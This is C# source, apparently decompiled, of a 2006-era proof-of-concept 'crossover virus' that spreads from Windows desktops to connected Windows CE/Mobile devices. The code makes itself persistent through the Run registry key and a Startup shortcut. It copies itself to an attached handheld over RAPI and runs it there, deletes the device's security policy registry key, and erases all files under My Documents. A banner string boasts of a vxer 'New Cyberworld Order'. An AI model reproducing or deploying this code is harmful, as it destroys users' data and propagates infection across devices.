using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using OpenNETCF.Desktop.Communication;

namespace ConsoleApplication1;

internal class Class1
{
	[STAThread]
	private static void Main(string[] args)
	{
		string text = " ";
		_ = text == "the crossover virus - poc - by Dr. Julius Storm - The great walls of China that separated the domains between wired and wireless, desktop and handhelds have been reduce to ruble.  Vxers are entering a new era of greater vx possibilities with the chance of reaching more systems around the world than ever before.  The viruses of the past are nothing compared to what the future holds.  2006 marks the establishment of a New Cyberworld Order with vxers around the world united at the forefront.  The time is now to prepare and defend, are you ready?";
		string text2 = Environment.OSVersion.ToString();
		Console.WriteLine(text2);
		text2 = text2.ToLower();
		int num = text2.IndexOf("ce");
		int num2 = text2.IndexOf("mobile");
		if (num < 1 && num2 < 1)
		{
			try
			{
				RAPI rAPI = new RAPI();
				string codeBase = Assembly.GetExecutingAssembly().GetName().CodeBase;
				codeBase = codeBase.Replace("/", "\\");
				int num3 = codeBase.LastIndexOf("\\");
				string text3 = codeBase.Substring(num3 + 1, codeBase.Length - num3 - 1);
				codeBase = codeBase.Remove(0, 8);
				codeBase = codeBase.Substring(0, codeBase.LastIndexOf("\\") + 1);
				string fileName = codeBase + text3;
				FileInfo fileInfo = new FileInfo(fileName);
				Random random = new Random();
				string text4 = Convert.ToString(random.Next()) + ".exe";
				string text5 = "c:\\windows\\" + text4;
				AutoStartApps autoStartApps = new AutoStartApps("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
				autoStartApps.Add(text5);
				rAPI.Connect();
				while (!rAPI.DevicePresent)
				{
					rAPI.Connect();
				}
				fileInfo.CopyTo(text5);
				string text6 = "\\Windows\\" + text4;
				rAPI.CopyFileToDevice(text5, text6, Overwrite: true);
				rAPI.CreateProcess(text6, "0");
				rAPI.Disconnect();
				int num4 = text2.IndexOf("3.0");
				if (num4 < 1)
				{
					CERegistryKey cERegistryKey = new CERegistryKey(2147483650u, "Security", writable: true, isroot: true);
					cERegistryKey.OpenSubKey("Policies");
					cERegistryKey.DeleteSubKey("Policies");
				}
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		string text7 = " ";
		string codeBase2 = Assembly.GetExecutingAssembly().GetName().CodeBase;
		codeBase2 = codeBase2.Replace("/", "\\");
		text7 = codeBase2;
		int num5 = 1;
		string curdir = "\\My Documents\\";
		traversefilesystem(curdir, text7, 1);
		num5 = 0;
		string text8 = "\\";
		DirectoryInfo directoryInfo = new DirectoryInfo(text8);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo2 in array)
		{
			string curdir2 = text8 + directoryInfo2.Name;
			traversefilesystem(curdir2, text7, num5);
		}
	}

	public static void traversefilesystem(string curdir, string virloc, int yesno)
	{
		if (yesno == 0)
		{
			try
			{
				if (curdir == "\\Windows")
				{
					Random random = new Random();
					string text = Convert.ToString(random.Next());
					string shortcut = "\\Windows\\Startup\\" + text + ".lnk";
					FileInfo fileInfo = new FileInfo(virloc);
					string text2 = text;
					text2 = curdir + "\\" + text2 + ".exe";
					fileInfo.CopyTo(text2);
					text += ".exe";
					SHCreateShortcut(shortcut, text2);
				}
			}
			catch (Exception)
			{
			}
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(curdir);
		FileSystemInfo[] fileSystemInfos = directoryInfo.GetFileSystemInfos();
		if (fileSystemInfos.Length <= 0)
		{
			return;
		}
		Array.Clear(fileSystemInfos, 0, fileSystemInfos.Length);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		if (yesno == 1)
		{
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo2 in array)
			{
				string text3 = " ";
				text3 = curdir + "\\" + fileInfo2.Name;
				scanfile(text3, virloc);
			}
		}
		if (directories.Length > 0)
		{
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo2 in array2)
			{
				string text4 = " ";
				text4 = curdir + "\\" + directoryInfo2.Name;
				traversefilesystem(text4, virloc, yesno);
			}
		}
	}

	private static void scanfile(string filename, string vl)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(filename);
			fileInfo.Delete();
		}
		catch (Exception)
		{
		}
	}

	[DllImport("coredll.dll")]
	private static extern bool SHCreateShortcut(string shortcut, string target);
}
